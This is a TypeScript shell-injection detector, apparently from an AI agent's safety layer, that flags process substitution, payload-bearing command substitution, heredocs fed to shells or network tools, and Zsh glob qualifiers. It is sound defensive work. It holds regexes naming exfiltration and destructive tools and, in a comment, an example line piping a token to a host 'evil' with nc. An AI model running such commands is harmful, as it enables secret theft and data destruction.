/**
 * VANTA-BASH-SECURITY-BLOCKS — pure shell-construct injection detector.
 *
 * Flags shell-command constructs that are easy obfuscation / injection vectors
 * BEFORE the kernel runs the command, so the agent layer can surface or escalate
 * them. Sibling to `dangerous-patterns.ts` (`isDangerousInterpreter`) and
 * `read-only-commands.ts` — same pure-classifier style.
 *
 * SECURITY — defense-in-depth, NOT a replacement for the kernel. The Rust kernel
 * `safety.rs` `assess()` is the real boundary and the OS sandbox is the real
 * containment; this only ADDS a TS-side detection/explanation signal. It can
 * never weaken the kernel — a flagged construct is still gated by `assess()`,
 * and an unflagged construct is NOT thereby "safe", just not matched here.
 *
 * Conservative + precise (low false-positive): a plain `ls -la`, a normal
 * `echo "$(date)"`, or a benign heredoc to a file is NOT flagged. A construct is
 * only flagged when it pairs an obfuscation vector with a destructive/exfil sink,
 * or is itself a process-substitution / dangerous Zsh glob qualifier.
 *
 * Risk classes returned in `risks`:
 *  - "process-substitution"        — `<(...)` / `>(...)` (runs the substituted fd)
 *  - "command-substitution-payload"— `$(...)` / backticks wrapping a destructive/exec token
 *  - "heredoc-injection"           — `<<` feeding a sensitive sink (shell/eval/exfil)
 *  - "zsh-glob-qualifier"          — `(N)`/`(om)`-style glob qualifiers on a destructive op
 *
 * NOT WIRED this round (pure detector + tests). Intended surface point:
 * `tools/shell-cmd.ts` `describeForSafety` (and/or the agent dispatch path in
 * `agent/dispatch-tool.ts`) could call `detectShellInjection(command)` and, when
 * `flagged`, append the matched `risks` to the safety description so the kernel
 * `assess()` sees the obfuscation class and escalates — mirroring how the
 * clarity-gate surfaces a signal without taking the safety decision itself.
 */

export type ShellInjectionRisk =
  | "process-substitution"
  | "command-substitution-payload"
  | "heredoc-injection"
  | "zsh-glob-qualifier";

export interface ShellInjectionResult {
  readonly flagged: boolean;
  readonly risks: ShellInjectionRisk[];
}

/**
 * Tokens that, when wrapped by a command substitution or fed by a heredoc,
 * mark the construct as a payload rather than a benign value. Covers destructive
 * filesystem ops, privilege escalation, history rewrite, and exfiltration egress.
 */
const PAYLOAD_TOKEN =
  /\b(?:rm|rmdir|unlink|mkfs|dd|shred|chmod|chown|sudo|doas|kill|pkill|killall|curl|wget|nc|ncat|netcat|scp|sftp|ssh|eval|exec|source)\b|>\s*\/dev\/|:\(\)\s*\{|\brm\s+-[rf]/i;

/** Process substitution: `<(cmd)` or `>(cmd)` — runs the substituted command's fd. */
const PROCESS_SUBSTITUTION = /[<>]\(/;

/** Sensitive heredoc sinks: a heredoc piped/fed into a shell, eval, or egress tool. */
const HEREDOC_SINK =
  /\b(?:ba|z|k|c|tc|da)?sh\b|\b(?:python[0-9.]*|node|deno|bun|perl|ruby|php|osascript|pwsh|powershell)\b|\beval\b|\b(?:curl|wget|nc|ncat|netcat)\b/i;

/**
 * A Zsh glob-qualifier group: a parenthesised qualifier such as `(N)`, `(om)`,
 * `(om[1])`, `(.N)`, `(/)` appended directly to a glob char (`*`, `?`, `]`) —
 * not a normal subshell `(cmd)` (which is preceded by whitespace / a command
 * word, never a glob char). The qualifier body is a short run of qualifier
 * symbols (letters, digits, and the glob-qualifier punctuation `. / @ = % : ^ -
 * [ ]`) with NO whitespace — so `echo (foo)` / `$( ... )` / `( cd x )` don't
 * match (they have spaces or a `$`/word boundary before `(`).
 */
const ZSH_GLOB_QUALIFIER = /[*?\]](\([a-zA-Z0-9.\/@=%:^\[\]-]+\))/;

/** Locate the command-substitution / backtick bodies in a line (non-nested, conservative). */
function substitutionBodies(command: string): string[] {
  const bodies: string[] = [];
  const dollar = /\$\(([^()]*)\)/g; // $( ... ) — flat body (no nested parens)
  const backtick = /`([^`]*)`/g; // ` ... `
  for (const m of command.matchAll(dollar)) bodies.push(m[1] ?? "");
  for (const m of command.matchAll(backtick)) bodies.push(m[1] ?? "");
  return bodies;
}

/** True when any command-substitution body wraps a destructive/exec payload token. */
function hasCommandSubstitutionPayload(command: string): boolean {
  return substitutionBodies(command).some((body) => PAYLOAD_TOKEN.test(body));
}

/** A `> file` / `>> file` redirect to a plain path (not a `/dev/*` device). */
const PLAIN_FILE_REDIRECT = /[12&]?>>?\s*(?!\/dev\/)\S+/;

/**
 * True when a heredoc / here-string (`<<` / `<<-` / `<<<`) feeds a sensitive
 * sink. The body is consumed by the command on the heredoc's head AND any
 * downstream pipe target (`cat secrets <<< $TOKEN | nc evil`), so we scan the
 * whole line for a sink. A heredoc whose head only redirects the body to a plain
 * file (`cat > out.txt <<EOF`) is benign — no sink, just authoring a file.
 */
function hasHeredocInjection(command: string): boolean {
  if (!/<<-?<?/.test(command)) return false;
  const head = command.split(/<<-?<?/)[0] ?? "";
  // Benign authoring: the body is redirected to a plain file and no sink follows.
  if (PLAIN_FILE_REDIRECT.test(head) && !HEREDOC_SINK.test(command)) return false;
  return HEREDOC_SINK.test(command);
}

/** True when a Zsh glob qualifier is applied to a destructive operation. */
function hasZshGlobQualifier(command: string): boolean {
  if (!ZSH_GLOB_QUALIFIER.test(command)) return false;
  // Only escalate when the line is also a destructive op — `print -l *(N)` is benign.
  return PAYLOAD_TOKEN.test(command);
}

/**
 * Detect dangerous shell-command constructs in a single command line. Pure.
 * Returns `{flagged, risks}` — `risks` names every matched class (deduped,
 * stable order). A plain command flags nothing. Conservative: empty input and
 * benign substitutions/heredocs/globs are not flagged.
 */
export function detectShellInjection(commandLine: string): ShellInjectionResult {
  const command = commandLine.trim();
  const risks: ShellInjectionRisk[] = [];
  if (command === "") return { flagged: false, risks };
  if (PROCESS_SUBSTITUTION.test(command)) risks.push("process-substitution");
  if (hasCommandSubstitutionPayload(command)) risks.push("command-substitution-payload");
  if (hasHeredocInjection(command)) risks.push("heredoc-injection");
  if (hasZshGlobQualifier(command)) risks.push("zsh-glob-qualifier");
  return { flagged: risks.length > 0, risks };
}

/** True when a command contains any flagged injection construct. */
export function hasShellInjection(commandLine: string): boolean {
  return detectShellInjection(commandLine).flagged;
}
